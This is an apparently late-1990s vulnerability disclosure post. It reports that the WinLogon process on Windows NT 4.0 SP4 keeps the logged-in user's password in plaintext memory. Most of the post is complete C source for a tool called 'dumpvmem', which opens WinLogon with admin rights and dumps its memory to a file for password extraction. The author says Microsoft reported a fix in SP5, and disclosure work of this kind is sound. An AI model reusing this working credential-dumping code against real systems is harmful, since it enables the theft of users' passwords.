While this does require admin rights for this to work the implications of
social engineering or an exploit to run after compromising the admin account
are obvious.  I contacted MS about this and they indicated it was fixed in
NT 4.0 SP5 - I have not retested it on SP5 yet to be sure.  This does work
on SP4 (and presumably previous SP versions as well).  I also don't see
anything in SP5's release note discussing this change - unless they have
chosen a sufficiently benign way of phrasing the problem.

The basic idea is that if WinLogon's process is opened (OpenProcess) with
PROCESS_VM_READ and then the VM is read with ReadProcessMemory - within the
first several hundred bytes (in the form of Unicode environment variables)
is the logged in users password, twice, in plaintext in an easy to parse
format.

Here is some code to demonstrate this - you must be running as administrator
for this to work:

/***************************************************************
 * dumpvmem
 *
 * dumps the contents of a process virtual mem to a file for
 * browsing later.  If run with admin privs and the process
 * winlogon is used ... the users password is all over the
 * place in the first few hundred bytes.
 *
 * Robert Horvick [Kanin]   Great Plains Software
 * 12/2/1999                     rhorvick@acm.org
 *
 *
 * Command Line
 *     pid      - decimal process id
 *     szPath   - path to the file to dump memory to
 *
 ****************************************************************/

#include <windows.h>
#include <stdio.h>

/*
 * Highly inefficient - allocations occur in page size minimums.
 *                      They should be used for real work.  Since
 *                      the password shows up so quickly ... meh.
 */
DWORD DumpMemory(HANDLE hProc, LPSTR szPath)
{
    LPSTR   lpOffset = (void*)1;
    CHAR    vBuf[1];
    DWORD   dwRead = 0;
    BOOL    bLastRead = FALSE;
    DWORD   dwDumpedBytes = 0;

    FILE *f;
    f = fopen(szPath, "wb");
    if(f)
    {	
        while(lpOffset++)
        {
            if(ReadProcessMemory( hProc,
                lpOffset,
                vBuf,
                1,
                &dwRead))
            {
                if(bLastRead)
                {
                    fprintf(f, "%c", vBuf[0]);
                }
                else
                {
                    fprintf(f, "\noffset %lx\n", lpOffset);
                    fprintf(f, "%c", vBuf[0]);
                    bLastRead = TRUE;
                }
                dwDumpedBytes++;
            }
            else
            {
                bLastRead = FALSE;
            }
        }
        fclose(f);
    }
    else
    {
        fprintf(stderr, "Unable to open %s", szPath);
    }

    return dwDumpedBytes;
}

int main(int argc, char **argv)
{
    DWORD   dwPid   = 0;
    BOOL    bWorked = FALSE;
    HANDLE  hProc   = 0;
    char    *szPath = 0;

    if (argc < 2)
    {
        fprintf(stderr, "dumpvmem <pid> <path to dump file>");

        return EXIT_FAILURE;
    }

    dwPid = atol(argv[1]);
    szPath = argv[2];
	
    hProc = OpenProcess(PROCESS_VM_READ, FALSE, dwPid);

    if(hProc)
    {
        /* Play nice ... that is a tight loop up there. */
        HANDLE hMe = GetCurrentProcess();
        SetPriorityClass(hMe, IDLE_PRIORITY_CLASS);

        DumpMemory(hProc, szPath);
        CloseHandle(hProc);
    }
    else
    {
        fprintf(stderr, "Unable to open %ld for PROCESS_VM_READ\n", dwPid);
    }

    return 0;
}

The created file will be obvious enough.

Robert Horvick, Fargo ND

